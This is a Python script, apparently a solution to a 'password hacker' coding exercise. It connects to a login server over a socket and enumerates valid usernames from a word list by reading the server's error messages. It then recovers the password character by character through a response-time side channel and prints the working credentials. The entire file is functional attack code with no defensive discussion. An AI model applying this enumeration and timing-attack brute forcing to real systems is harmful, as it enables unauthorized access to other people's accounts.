import sys
import socket
import string
import json
from datetime import datetime

args = sys.argv
hostname = args[1]
port = int(args[2])

listx = []

sys.setrecursionlimit(10**6)

def logx(logins_list):
    for log in logins_list:
        result = {"login": f"{log}", "password": " "}
        time_diff, response = general(result, client_socket)
        if response == "Wrong password!":
            return result


def passgen(login_wrongpw, passlist, client_socketx):
    login_wrongpw_test = login_wrongpw
    for i in string.ascii_letters + string.digits:
        passlist_try = passlist
        passlist_try.append(i)
        passlist_try = "".join(passlist_try)
        login_wrongpw_test["password"] = passlist_try
        time_diff, response = general(login_wrongpw_test, client_socketx)
        json_str = json.dumps(login_wrongpw_test)
        if time_diff >= 1000 and response == "Wrong password!":
            return True
        elif response == "Connection success!":
            print(json_str)
            return False
        else:
            passlist.pop()


def general(resultx, client_socketx):
    json_str = json.dumps(resultx)
    data_ = json_str.encode()
    start = datetime.now()
    client_socketx.send(data_)
    responsex = client_socketx.recv(1024)
    finish = datetime.now()
    difference = (finish - start).microseconds
    return difference, json.loads(responsex.decode())["result"]


with open('../task/hacking/logins.txt', 'r', encoding='utf-8') as flg:
    logins = [line.strip() for line in flg]

with socket.socket() as client_socket:
    address = (hostname, port)
    client_socket.connect(address)

    correct_login_no_pass = logx(logins)

    while True:
        if not passgen(correct_login_no_pass, listx, client_socket):
            break
